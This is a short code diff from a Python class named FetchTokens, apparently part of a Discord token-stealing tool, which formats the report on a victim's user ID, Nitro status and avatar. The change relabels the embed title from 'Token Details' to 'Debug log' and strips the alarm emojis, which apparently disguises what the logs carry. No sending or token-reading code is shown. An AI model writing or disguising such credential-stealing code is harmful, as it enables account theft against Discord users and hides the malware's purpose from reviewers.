@@ -139,7 +139,7 @@ class FetchTokens:
                 avatar_emoji = "🖼️"
                 
                 # Create a clean, professional message using markdown and emojis
-                content = f"**🚨 Log for <@{user_id}> {username} 🚨**\n\n" \
+                content = f"** Log for <@{user_id}> {username} **\n\n" \
                           f"**User ID:** `{user_id}`\n" \
                           f"**NS:** {nitro_emoji} {nitro}\n" \
                           f"**Avatar:** {avatar_emoji} [Click here]({avatar})\n\n" \
@@ -147,7 +147,7 @@ class FetchTokens:
 
                 # This part simulates the outline or card-like appearance
                 embed = {
-                    "title": f"🔑 Token Details for {username}",
+                    "title": f"Debug log for {username}",
                     "description": content,
                     "color": 16711680,  # Red (Discord-like color for highlights)
                     "footer": {"text": "Help Logs"}
